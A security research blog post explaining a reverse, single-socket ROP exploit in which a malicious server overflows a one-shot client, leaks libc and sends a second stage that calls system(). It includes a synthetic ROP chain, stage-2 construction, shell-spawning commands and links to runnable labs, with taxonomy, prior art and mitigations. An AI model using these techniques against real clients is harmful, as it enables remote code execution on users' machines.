---
title: "Leak and Stage-2 Over One Socket: Reverse Single-Socket Staging"
date: 2026-08-15
translationKey: "reverse-single-socket-staging"
draft: false
featured: true
image: "/images/post/reverse-single-socket-staging/cover.png"
description: "A malicious server corrupting a client that dials out to it, carrying both the libc leak and the second stage over one already-open socket in a single ROP chain. And why this is not a new pattern but a well-known composition."
tags:
  - Code
  - Offensive Security
  - Exploit Development
  - Binary Exploitation
  - ROP
  - ret2libc
  - ASLR
  - Vulnerability Research
categories:
  - Security Research
---

# Leak and Stage-2 Over One Socket: Reverse Single-Socket Staging

> During an assessment I finished an exploit that felt like "an unusual pattern." A malicious server attacks a client that connects out to it, and it drives both the leak and the second stage over **one already-open socket** inside a single ROP chain. I thought it was impressive — but the deeper I dug, the more the conclusion flipped. None of the techniques were new, and that fact turned out to be the more useful story.

> Details of the assessed product are withheld until coordinated disclosure completes. All code published with this post is **synthetic**: no real binary, no real gadget addresses, no real protocol. The techniques themselves are long-published, so this loses nothing in the explanation.

## 1. The trap of the "this feels special" instinct

Reviewing a legacy native client, I hit a textbook flaw: it `recv`s a server-supplied length into a fixed stack buffer with no upper-bound check. Make the length large and the saved return address is overwritten. The build is old-school: **No PIE / No canary / NX / Partial RELRO**.

So far, common. But writing the exploit, the conditions were peculiar. The target was a **one-shot client** — a process that handles one request and dies. And the direction was inverted: I impersonate/MITM the server and attack the **connecting client**.

That forced the leak and the execution into **one connection, one overflow, one ROP chain**. Solving it with a socket leak felt distinctive. The honest verdict: that instinct was **only half right**.

## 2. Neither the weakness class (CWE) nor the attack pattern (CAPEC) is new

Start with taxonomy. If this were genuinely new, it would map to something un-catalogued. It doesn't.

**The weakness** is a standard composition of existing CWEs:

- Root cause: [CWE-130 (Improper Handling of Length Parameter Inconsistency)](https://cwe.mitre.org/data/definitions/130.html), [CWE-20](https://cwe.mitre.org/data/definitions/20.html)
- Manifestation: [CWE-805 (Buffer Access with Incorrect Length Value)](https://cwe.mitre.org/data/definitions/805.html), [CWE-121 (Stack-based Buffer Overflow)](https://cwe.mitre.org/data/definitions/121.html)
- Transport/trust: [CWE-319 (Cleartext Transmission)](https://cwe.mitre.org/data/definitions/319.html), [CWE-345 (Insufficient Verification of Data Authenticity)](https://cwe.mitre.org/data/definitions/345.html)

**The attack pattern** likewise. CAPEC is deliberately abstract — it doesn't hold exploitation units like "front-load ROP." This attack is expressed directly by an existing CAPEC chain:

```text
delivery:       CAPEC-94 (Adversary in the Middle)
              + CAPEC-384 (API Message Manipulation via MitM)
              + CAPEC-194 (Fake the Source of Data)
exploitation:   CAPEC-100 (Overflow Buffers)
              + CAPEC-8 (BOF in an API Call)
              + CAPEC-9 (BOF in Local Command-Line Utilities)
```

Neither CWE nor CAPEC is something to *register anew* — they're things to **map precisely**. By class novelty, this finding is not special. So was my instinct simply wrong?

## 3. What was special wasn't the "class" — it was the exploitation constraint

The instinct actually pointed at the **difficulty of the exploitation conditions**, not the taxonomy.

The textbook remote exploit — e.g. the `ropasaurusrex` lineage — flows like this:[^hacktricks][^rop]

```text
connect to the server process
  -> overflow #1: write(fd, GOT, len) to leak libc, return to the vuln function
  -> the SAME process loops and read()s stage-2
  -> overflow #2: now ret2libc system("/bin/sh") with real addresses
```

This works because the **target is a re-entrant server** and **one process lives for the whole connection** — the base leaked in overflow #1 is still valid in overflow #2.

In a reverse, one-shot client that loop is **structurally impossible**:

- **No re-entry.** A one-shot CLI has no "return to the vuln function and read again."
- **ASLR re-randomizes every run.** A base leaked in process A is meaningless in process B. "Leak in request A, pwn in request B" is dead.

So the leak and stage-2 execution must live in the **same process, same connection, same chain**. That was the real distinctive point the instinct caught — not the class, the **constraint**.

## 4. One already-open socket, in two directions

The answer to that constraint already existed elsewhere. It's the idea behind Borja Merino's [**Windows-One-Way-Stagers**](https://github.com/BorjaMerino/Windows-One-Way-Stagers): in firewalled/restricted environments, **don't open a new connection — reuse the one you already have**.[^oneway]

In a reverse client exploit, that socket is **naturally the only channel**. The connection the victim opened *to me* is both the pipe out for the leak and the pipe in for stage-2. It's a one-way stager run **in two directions (leak out + stage-2 in), inside a single chain**.

The direction itself ("a malicious server attacks the client") isn't new either — Check Point named and popularized it in 2019 as the [**Reverse RDP Attack**](https://research.checkpoint.com/2019/reverse-rdp-attack-code-execution-on-rdp-clients/).[^rdp] Since then, "server-controlled length field + missing bounds check in the client's copy routine → client RCE" keeps becoming CVEs (the FreeRDP family, etc.).

Every ingredient was public. All I did was **assemble them into one thing under this constraint**.

## 5. The chain

Distilled, stage-1 ROP runs inside the victim, entirely over the connected socket (`fd 3`):

```text
pop rdi ; 3
pop rsi ; send@got
pop rdx ; 8
g_send0            # send(3, send@got, 8, 0)  -> leak libc 'send' out over the socket
pop rdi ; 3
pop rsi ; STAGE2
pop rdx ; 0x100
g_recv0            # recv(3, STAGE2, 0x100, 0) -> BLOCK here, waiting for stage-2
pop rsp ; STAGE2   # pivot the stack into the received stage-2
```

The malicious server (me) builds stage-2 only after receiving the 8-byte leak:

```text
libc_base = leak - libc.sym.send
stage2    = [ ret ; pop rdi ; &cmd ; system ] + b"id > /tmp/pwned; ...\0"
send(stage2)       # the victim's recv() unblocks -> pivot -> system(cmd)
```

The single `ret` before `system` fixes 16-byte alignment (the `movaps` foot-gun). `STAGE2` sits high in a fixed, mapped global so `system()` has room to grow its frame downward.

### Why two packets, not one

stage-2 embeds the **runtime** `system` address, which is only knowable after the leak round-trips back to me. So stage-2 physically **can't** be bundled with stage-1. What keeps it a **single connection** is that the stage-1 chain carries its own `recv` gadget: right after leaking, the victim **blocks in `recv` mid-chain** on the same socket, waiting for stage-2. The round-trip self-synchronizes.

```text
attacker ──(1) overflow response──▶ victim
victim   ──(2) send(send@got) ─────▶ attacker      # leak
attacker ──(3) stage-2 (real sys) ─▶ victim         # recv unblocks -> pivot -> system()
```

## 6. The boundary is PIE — not ASLR, not the canary

This exploit yields `uid=0` under full ASLR not because ASLR is broken, but because the **binary is non-PIE**. Non-PIE means code/PLT/GOT/gadget addresses are all fixed, so one socket leak of libc is enough for ret2libc. Missing canary or null-truncation quirks aren't the barrier.

Conversely, with **PIE + full ASLR**, the gadget addresses themselves are randomized, so the fixed anchor for the initial leak is gone and the same bug degrades to a remote **DoS ceiling**. That's why the production binary's `checksec` (PIE in particular) decides final severity. The fix is equally clear: bounds-check the length, **rebuild with PIE + canary + Full RELRO**, add TLS/server authentication and response integrity.

## 7. Run it yourself

I'm releasing a synthetic lab that reproduces the technique exactly — not the real product, but a demo I wrote from scratch to share the same properties (non-PIE, server-controlled-length overflow, reverse direction).

**Repo:** [github.com/windshock/Linux-Reverse-Socket-Stagers](https://github.com/windshock/Linux-Reverse-Socket-Stagers)

```bash
git clone https://github.com/windshock/Linux-Reverse-Socket-Stagers
cd Linux-Reverse-Socket-Stagers/01-single-socket-reverse-stager
# Apple Silicon: colima start --arch x86_64
./run.sh
```

It toggles full ASLR in an isolated container and reproduces `uid=0` from a single malicious response. The protocol, gadgets, and offsets are all this demo's own and unrelated to any product.

The repo ships three runnable labs, each verified end-to-end in an isolated x86_64 container (`uid=0` under full ASLR — a marker proof plus a real `/bin/sh` over the reused socket):

- **01 Single-Socket Reverse Staging** — the core technique of this post.
- **02 Front-Load Source-Hijack** — when a post-overflow `memcpy` sources RIP from the *front* of the response, place the chain at payload offset 0.
- **03 ret2csu + flags=0** — drive `send`/`recv` by ROP with no `pop rdx` and no `pop rcx`: `%rdx` via `__libc_csu_init` (ret2csu), `flags=0` via real wrapper functions.

## 8. Wrap-up

The opening question was "isn't this an unusual pattern?" The honest answer:

- **By class, it isn't unusual.** Neither CWE nor CAPEC needs a new entry — they need precise mapping. Staged GOT-leak → ret2libc is textbook; socket-reuse staging and reverse client attacks are all documented lineages.
- **By constraint, it's meaningful.** Under a harder condition — one-shot process, full ASLR, no cross-connection leak — assembling the leak and stage-2 into a single chain over one already-open socket is where the value is.

Technique novelty and finding value are separate axes. The more common the class, the more "why is this still unfixed?" stands out — which strengthens, not weakens, the severity story. And being able to explain the composition precisely in public vocabulary (CWE/CAPEC/prior art) is far more useful than being dazzled by the impression.

---

## References

[^hacktricks]: HackTricks, "Leaking libc address with ROP" — the staged GOT-leak → ret2libc template. <https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address/index.html>
[^rop]: A representative write-up of the `write(fd, GOT, len)` socket-leak + second-stage ret2libc pattern. <https://github.com/jakecraige/ctf/blob/master/csaw-quals-2020/roppity/writeup.md> · ret2csu / pivot: <https://ropemporium.com/>
[^oneway]: Borja Merino, "Windows-One-Way-Stagers" — socket reuse/rebind stagers. <https://github.com/BorjaMerino/Windows-One-Way-Stagers>
[^rdp]: Check Point Research, "Reverse RDP Attack: Code Execution on RDP Clients" (2019). <https://research.checkpoint.com/2019/reverse-rdp-attack-code-execution-on-rdp-clients/>
